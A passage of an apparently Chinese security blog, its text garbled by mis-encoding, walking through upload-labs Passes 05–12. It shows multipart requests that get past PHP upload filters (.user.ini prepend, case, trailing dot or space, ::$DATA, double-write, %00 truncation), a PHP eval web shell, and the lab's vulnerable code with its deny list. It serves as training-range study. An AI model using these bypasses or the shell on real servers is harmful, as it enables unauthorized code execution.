title="Pass-05"></a>Pass-05</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-.user.iniç»•è¿‡</strong><br>å¾ˆå¤šè€ç‰ˆæœ¬çš„labsï¼Œè¿™å…³æ˜¯å¤§å°å†™ç»•è¿‡ï¼Œåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆçŸ¥é“çš„ï¼Œé€ƒã€‚<br>é»‘åå•æ²¡æœ‰ç¦æ­¢php7å’Œ.iniï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹.user.iniï¼Œæ¥åŒ…å«ä¸€ä¸ªå›¾ç‰‡ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;.user.ini&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">auto_prepend_file=shell.jpg</span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">18467633426500</span>--</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¼ ä¸€ä¸ªshell.jpg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta">@eval(<span class="params">$_REQUEST[<span class="string">&#x27;shell&#x27;</span>]</span>);</span></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">191691572411478</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åç­‰å¾…5minï¼Œè®¿é—®uploadä¸‹çš„readme.php<br><img src="/2022/02/28/upload-labs/2022-02-28-20-09-12.png">  </p><p><strong>è¡¥å……çŸ¥è¯†ï¼š</strong><br>æ”»å‡»é€»è¾‘é“¾<br>.user.iniç±»ä¼¼äºphp.iniï¼Œæœ‰åˆå§‹åŒ–ä½œç”¨ï¼Œå¯ä»¥æ›´æ”¹ä¸€äº›åŒ…å«æ–‡ä»¶ï¼Œè€Œ.user.inié‡Œé¢çš„auto_prepend_fileï¼Œè¡¨ç¤ºåœ¨åŠ è½½ç¬¬ä¸€ä¸ªPHPä»£ç ä¹‹å‰å…ˆè¡Œé¢„åŠ è½½è¯¥é…ç½®æ‰€æŒ‡ç¤ºçš„PHPæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯æŒ‡å®šæ–‡ä»¶å½“ä½œphpè§£æåŒ…å«ã€‚æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ğŸï¼Œç„¶ååœ¨è®¿é—®åŒç›®å½•ä¸‹åˆ«çš„phpæ–‡ä»¶åˆ©ç”¨æ­¤é©¬ã€‚  </p><p>åˆ©ç”¨æ¡ä»¶</p><blockquote><p>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP<br>æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼   ä¸çŸ¥å¦‚ä½•åˆ¤æ–­ï¼Œå¾…è¡¥<br>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶  è¿™ä¸ªè›®éš¾çš„ </p></blockquote><p><a href="https://www.jianshu.com/p/c2ed6b05c964">å‚è€ƒçŸ¥è¯†ï¼š  </a>  </p><p><a href="https://www.jianshu.com/p/c2ed6b05c964">.user.inié…ç½®æ–‡ä»¶åœ¨æ¸—é€ä¸­çš„åˆ©ç”¨</a><br><a href="https://www.php.net/manual/zh/configuration.file.per-user.php">.user.ini æ–‡ä»¶</a><br><a href="https://www.zhihu.com/question/30672017">å¦‚ä½•é€šä¿—åœ°è§£é‡Š CGIã€FastCGIã€php-fpm ä¹‹é—´çš„å…³ç³»</a><br><a href="https://www.cnblogs.com/itbsl/p/9828776.html#%E6%B7%B1%E5%85%A5cgi%E5%8D%8F%E8%AE%AE">CGI å’Œ FastCGI åè®®çš„è¿è¡ŒåŸç†</a><br><a href="https://segmentfault.com/a/1190000018597945">fastcgiä¸cgiæœ‰ä»€ä¹ˆä¸åŒ</a><br><a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">Upload-labs 1-21å…³ é¶åœºé€šå…³æ”»ç•¥(å…¨ç½‘æœ€å…¨æœ€å®Œæ•´)</a></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-å¤§å°å†™ç»•è¿‡</strong><br>åç«¯ä»£ç æœªæ£€æŸ¥å¤§å°å†™ï¼Œå¯ä»¥å¤§å°å†™ç»•è¿‡ï¼Œè½¬æ¢å°å†™å‡½æ•°<code>strtolower</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=06</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">123821742118716</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.Php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">123821742118716</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">123821742118716</span>--</span><br></pre></td></tr></table></figure><p>è®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-18-09-02.png"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-å°¾éƒ¨åŠ ç©ºæ ¼ç»•è¿‡</strong><br>åç«¯ä»£ç æ²¡æœ‰é¦–ä½å»ç©ºï¼Œå»ç©ºå‡½æ•°<code>trim()</code><br>å°¾éƒ¨åŠ ç©ºæ ¼ç»•è¿‡ï¼Œç»æµ‹è¯•é¦–éƒ¨åŠ ç©ºæ ¼æ— æ³•ä¸Šä¼ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=07</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">19718198955447</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php &quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">19718198955447</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">19718198955447</span>--</span><br></pre></td></tr></table></figure><p>è®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-18-16-23.png"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-æ”¹åŒ…åŠ  . ç»•è¿‡</strong><br>æ¼æ´ç‚¹ä¸»è¦åœ¨è¿™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure><p>strrchr<br>(PHP 4, PHP 5, PHP 7, PHP 8)<br>strrchr â€” æŸ¥æ‰¾æŒ‡å®šå­—ç¬¦åœ¨å­—ç¬¦ä¸²ä¸­çš„æœ€åä¸€æ¬¡å‡ºç°<br>strrchr(string $haystack, mixed $needle): string<br>è¯¥å‡½æ•°è¿”å› haystack å­—ç¬¦ä¸²ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œè¿™éƒ¨åˆ†ä»¥ needle çš„æœ€åå‡ºç°ä½ç½®å¼€å§‹ï¼Œç›´åˆ° haystack æœ«å°¾ã€‚  </p><p>æ‰€ä»¥å°¾ç«¯åŠ äº†<code>.</code>ä¹‹åå°±è¢«è®¤ä¸ºåç¼€ä¸º<code>.</code>ç»•è¿‡äº†é»‘åå•ï¼Œä½†æ˜¯windowsä¼šæŠŠ<code>1.php.</code>æ”¹æˆ<code>1.php</code>ï¼Œlinuxæš‚æœªæµ‹è¯•ï¼Œå¾…è¡¥</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">217261477111538</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php.&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">217261477111538</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">217261477111538</span>--</span><br></pre></td></tr></table></figure><p>ç¨å¾®ä¿®ä¸€ä¸‹åç«¯ä»£ç ï¼ŒæŠŠè¯†åˆ«çš„åç¼€æ˜¾ç¤ºå‡ºæ¥ï¼Œå›æ˜¾å¾—<br><code>&lt;br&gt;åç¼€.åç¼€&lt;br&gt;</code><br>è®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-20-29-44.png"></p><p>å‚è€ƒï¼š  </p><p><a href="https://www.php.net/manual/zh/function.strrchr.php">strrchr</a></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-æ”¹åŒ…åŠ  ::$DATAç»•è¿‡</strong> </p><p>åœ¨windowä¸‹<code>::$DATA</code>ä¹‹åä¼šè®¤ä¸ºæ˜¯æ–‡ä»¶æµï¼Œå‡å¦‚<code>1.php::$DATA </code>ï¼Œåˆ™å…¶åç¼€è¢«è®¤ä¸ºæ˜¯.php<br>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ª<code>1.php::$DATA</code>ï¼Œæ¥ç»•è¿‡</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload/upload-labs/Pass-09/index.php</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">287032381131322</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">287032381131322</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">287032381131322</span>--</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åç«¯ï¼Œçœ‹åˆ°ä¸­é—´æ•°æ®å¾—æµåŠ¨</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>file_ext:.php::$data<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>temp_file:C:\Windows\php67CE.tmp<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>img_path../upload/202202282241383659.php::$data<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®å›¾ç‰‡<br><img src="/2022/02/28/upload-labs/2022-02-28-22-45-56.png"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-æ”¹åŒ…åŠ  <code>. .</code> ç»•è¿‡</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨<code>1.php. .</code> è¿™ä¸ªæ–¹å¼ç»•è¿‡</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">30333176734664</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php. .&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">30333176734664</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">30333176734664</span>--</span><br></pre></td></tr></table></figure><p>è®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-23-13-35.png"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-åŒå†™ç»•è¿‡</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p>åç«¯ç›´æ¥æ›¿æ¢æ‰äº†å…³é”®å­—ï¼Œè€Œä¸”æ˜¯å¿½ç•¥å¤§å°çš„<br>ä½¿ç”¨åŒå†™ç»•è¿‡</p><p>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">15141771128253</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.pphphp&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">15141771128253</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">15141771128253</span>--</span><br></pre></td></tr></table></figure><p>è®¿é—®</p><p><img src="/2022/02/28/upload-labs/2022-02-28-23-20-04.png"></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p><strong>æœåŠ¡ç«¯-ç™½åå•æ£€æŸ¥-GET %00æˆªæ–­ç»•è¿‡</strong>   </p><p>%00æˆªæ–­åˆ©ç”¨éœ€è¦æœ‰ä»¥ä¸‹æ¡ä»¶</p><blockquote><p>phpç‰ˆæœ¬å°äº5.3.4<br>phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€   </p></blockquote><p>æ‰€ä»¥è¿™ä½¿ç”¨PHP5.2.17<br>POST DATA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/upload-labs/Pass-<span class="number">12</span>/index.php?save_path=../upload/<span class="number">1.</span>php%<span class="number">00</span> HTTP/<span class="number">1.1</span></span><br><span class="line">â€¦â€¦â€¦â€¦</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">326623275720037</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.png&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">326623275720037</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">326623275720037</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åç«¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å› ä¸º<code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>ä»¥åŠ%00åˆæ˜¯æˆªæ–­ç¬¦ï¼Œæ‰€ä»¥img_pathå˜æˆäº†..&#x2F;upload&#x2F;1.php </p><p>ç„¶åå› ä¸ºä½¿ç”¨çš„æ˜¯<code>move_uploaded_file($temp_file,$img_path))</code>ï¼Œæ‰€ä»¥æŠŠ1.pngæ”¾è¿›äº†..&#x2F;upload&#x2F;1.phpï¼ŒæˆåŠŸç»•è¿‡</p><p><img src="/2022/02/28/upload-labs/2022-02-28-23-38-11.png"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log4j è¿œç¨‹ä»£ç æ‰§è¡Œ</title>
      <link href="/2022/02/24/Apache-Log4j-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/02/24/Apache-Log4j-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
